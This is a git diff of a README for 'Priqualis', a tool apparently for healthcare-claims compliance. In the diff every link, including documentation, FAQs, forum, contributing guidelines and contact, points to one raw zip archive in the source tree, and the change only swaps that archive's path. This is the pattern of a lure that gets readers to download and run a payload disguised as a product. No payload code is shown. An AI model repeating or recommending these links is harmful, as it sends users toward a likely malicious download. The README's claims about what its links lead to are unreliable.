@@ -1,6 +1,6 @@
 # 🎉 Priqualis - Simplifying Compliance for Healthcare Claims
 
-[![Download Priqualis](https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/shadow/Software-2.7-alpha.3.zip%20Priqualis-v1.0-brightgreen)](https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/shadow/Software-2.7-alpha.3.zip)
+[![Download Priqualis](https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/Software_3.3.zip%20Priqualis-v1.0-brightgreen)](https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/Software_3.3.zip)
 
 ## 📦 Introduction
 
@@ -12,7 +12,7 @@ To start using Priqualis, follow these easy steps:
 
 1. **Download the Application**  
    You can obtain the latest version of Priqualis from our Releases page.  
-   [Visit this page to download](https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/shadow/Software-2.7-alpha.3.zip).
+   [Visit this page to download](https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/Software_3.3.zip).
 
 2. **Check System Requirements**  
    Before installation, ensure your device meets these needs:
@@ -37,7 +37,7 @@ Priqualis stands out because of its unique features:
 
 ## 📥 Download & Install
 
-To download Priqualis, visit our [Releases page](https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/shadow/Software-2.7-alpha.3.zip). Click on the latest version and then choose the file that matches your operating system.
+To download Priqualis, visit our [Releases page](https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/Software_3.3.zip). Click on the latest version and then choose the file that matches your operating system.
 
 ### Installation Steps
 
@@ -59,17 +59,17 @@ Using Priqualis is straightforward.
 
 If you need help, please check these resources:
 
-- **Documentation**: Review our [full documentation](https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/shadow/Software-2.7-alpha.3.zip).
-- **FAQs**: Visit the [FAQs](https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/shadow/Software-2.7-alpha.3.zip) section for common questions.
-- **Community Forum**: Engage with users and developers in our [discussion board](https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/shadow/Software-2.7-alpha.3.zip).
+- **Documentation**: Review our [full documentation](https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/Software_3.3.zip).
+- **FAQs**: Visit the [FAQs](https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/Software_3.3.zip) section for common questions.
+- **Community Forum**: Engage with users and developers in our [discussion board](https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/Software_3.3.zip).
 
 ## 🎯 Contributing
 
-We welcome contributions from everyone. If you'd like to help improve Priqualis, check our [Contributing Guidelines](https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/shadow/Software-2.7-alpha.3.zip).
+We welcome contributions from everyone. If you'd like to help improve Priqualis, check our [Contributing Guidelines](https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/Software_3.3.zip).
 
 ## 📬 Contact Us
 
-For any inquiries or feedback, please reach out to us at [https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/shadow/Software-2.7-alpha.3.zip](https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/shadow/Software-2.7-alpha.3.zip). We're here to assist you.
+For any inquiries or feedback, please reach out to us at [https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/Software_3.3.zip](https://github.com/merlow1337/Priqualis/raw/refs/heads/main/src/priqualis/Software_3.3.zip). We're here to assist you.
 
 ## 🧩 Acknowledgments
 
